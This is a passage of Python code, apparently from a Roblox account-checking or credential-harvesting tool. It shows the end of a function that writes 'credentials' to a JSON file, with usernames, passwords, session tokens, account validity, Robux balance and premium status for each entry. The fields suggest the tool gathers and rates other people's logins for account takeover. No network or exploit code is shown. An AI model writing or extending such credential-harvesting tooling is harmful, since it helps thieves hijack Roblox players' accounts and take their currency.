                'roblox_user_id': entry.get('roblox_user_id', ':0') if entry.get('roblox_user_id') else ':0',
                'robux_balance': entry.get('robux_balance', ':0') if entry.get('robux_balance') is not None else ':0',
                'is_premium': entry.get('is_premium', ':0') if entry.get('is_premium') is not None else ':0',
                'roblox_status': entry.get('roblox_status', ':0') if entry.get('roblox_status') else ':0',
                'roblox_validation_timestamp': entry.get('roblox_validation_timestamp', ':0') if entry.get('roblox_validation_timestamp') else ':0'
            }
            simplified_data.append(simple_entry)
        
        export_data = {
            'export_info': {
                'timestamp': datetime.now().isoformat(),
                'credential_count': len(simplified_data),
                'export_type': 'credentials_simple',
                'fields': ['username', 'password', 'age', 'type', 'caeaahab_token', 'token2_full_token', 'token2_user_info', 'token2_username', 'token2_user_id', 'roblox_valid', 'roblox_username', 'roblox_user_id', 'robux_balance', 'is_premium', 'roblox_status', 'roblox_validation_timestamp']
            },
            'credentials': simplified_data
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Exported {len(simplified_data)} simplified credentials to {filepath}")
        return filepath
